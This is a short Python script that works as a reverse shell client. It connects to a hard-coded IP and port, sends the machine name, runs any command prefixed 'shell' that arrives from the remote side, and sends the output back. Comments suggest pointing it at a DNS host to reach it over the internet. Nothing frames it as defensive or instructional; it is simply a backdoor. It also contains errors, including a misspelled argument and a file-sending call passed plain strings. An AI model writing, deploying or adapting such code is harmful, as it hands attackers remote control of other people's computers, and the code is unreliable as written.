import socket, os, subprocess
def connect():
    os.system('cls')
    global host
    global port 
    global s 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    port = 5555
    host = ('10.8.101.56')#localIP in case your testing inside your network
    #host = socket.gethostbyname('YOURDNSHOSTHERE')
    #here you could insert a DNS host and then use it to connect over WAN.
    try:
        print ('[!] Trying to connect to %s:%s'%(host,port))
        s.connect((host,port))
        print ('[*] Connection estabilished.')
        s.sendfile(os.environ['COMPUTERNAME'])
    except:
        print ('Could not connect.')
def receive():
    receive = s.recv(1024)
    if receive == ('quit'):
        s.close()
    elif receive[0:5] == ('shell'):
        proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, strderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc2.stdout.read() + proc2.stderr.read()
        args = stdout_value
    else:
        args = ('no valid input was given.')
    send(args)
def send(args):
    send = s.sendfile(args)
    receive()
connect()
receive()
s.close()
